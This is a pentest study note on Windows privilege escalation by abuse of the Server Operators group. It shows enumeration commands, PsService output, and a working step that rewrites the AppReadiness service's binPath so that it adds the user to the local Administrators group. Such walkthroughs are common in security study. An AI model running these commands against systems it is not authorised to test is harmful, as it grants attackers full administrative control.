---
created: 2026-07-22
tags:
  - Windows
  - Windows_PrivEsc
status: substantial
---
## Server Operators

![[Windows groups#`Server Operators`]]

## Server Operators in privilege escalation


- Check whether the current user belongs to **`Server Operators`**:

```powershell
whoami /group
```

```powershell
net user %USERNAME%
```

- Verify the required privileges:

```powershell
whoami /priv
```

- Although `SeBackupPrivilege` and `SeRestorePrivilege` are useful, they is another way to get `SYSTEM` with `Server Operators`. 

## Privilege escalation via service control

- Pick a service and inspect it using [`sc qc`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742055(v=ws.11)); for example, [`AppReadiness`](https://batcmd.com/windows/11/services/appreadiness/):

```powershell
sc qc AppReadiness
```

- `SERVICE_START_NAME : LocalSystem` confirms the service executes as `SYSTEM`.

- To check service's permissions, you can use [`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) (from the Sysinternals Suite):

```powershell
C:\Tools\PsService.exe security AppReadiness
```

>[!example]- 
> ```powershell
> PS C:\Users\server_adm> C:\Tools\PsService.exe security AppReadiness
> 
> PsService v2.25 - Service information and configuration utility
> Copyright (C) 2001-2010 Mark Russinovich
> Sysinternals - www.sysinternals.com
> 
> SERVICE_NAME: AppReadiness
> DISPLAY_NAME: App Readiness
>         ACCOUNT: LocalSystem
>         SECURITY:
>         [ALLOW] NT AUTHORITY\SYSTEM
>                 Query status
>                 Query Config
>                 Interrogate
>                 Enumerate Dependents
>                 Pause/Resume
>                 Start
>                 Stop
>                 User-Defined Control
>                 Read Permissions
>         [ALLOW] BUILTIN\Administrators
>                 All
>         [ALLOW] NT AUTHORITY\INTERACTIVE
>                 Query status
>                 Query Config
>                 Interrogate
>                 Enumerate Dependents
>                 User-Defined Control
>                 Read Permissions
>         [ALLOW] NT AUTHORITY\SERVICE
>                 Query status
>                 Query Config
>                 Interrogate
>                 Enumerate Dependents
>                 User-Defined Control
>                 Read Permissions
>         [ALLOW] BUILTIN\Server Operators
>                 All
> ```

- `[ALLOW] BUILTIN\Server Operators : All` confirms that the Server Operators group has the [`SERVICE_ALL_ACCESS`](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right for this service. 
---

- Every Windows service stores the executable it launches. For example, `AppReadiness` normally points to `C:\Windows\System32\svchost.exe -k AppReadiness -p`, and when Windows starts the service, it simply executes this command. 
- But `Service Operators` (given the checks above pass) allows you to replace it **with an arbitrary command of your choice**.
- So, for privilege escalation, you simply need to change the binary path to execute a command which adds your current user to the default local administrators (or domain administrators) group, using [`sc config`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config):


```powershell
sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

>[!example]+
> ```powershell
> PS C:\Users\server_adm> sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
> 
> [SC] ChangeServiceConfig SUCCESS
> ```

>[!note] In PowerShell, `sc` is an alias for **`Set-Content`**, not `sc.exe`, so specify it explicitly.

- Then start the service:

```powershell
sc start AppReadiness
```

- Starting the service fails, which is expected. But by this time, the command you configured should have already executed. 
- Confirm your administrator group membership:

```powershell
net localgroup Administrators
```

>[!example]+
> ```powershell
> PS C:\Users\server_adm> net localgroup Administrators
> 
> Alias name     Administrators
> Comment        Administrators have complete and unrestricted access to the computer/domain
> 
> Members
> 
> -------------------------------------------------------------------------------
> Administrator
> Domain Admins
> Enterprise Admins
> server_adm
> The command completed successfully.
> ```

>[!tip] You may need to authenticate again to generate a new token with the changed privileges. You can use `runas /user:<username> cmd.exe` for this.
## References and further reading

- [`Windows Privilege Escalation: Server Operator Group — Hacking Articles`](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/)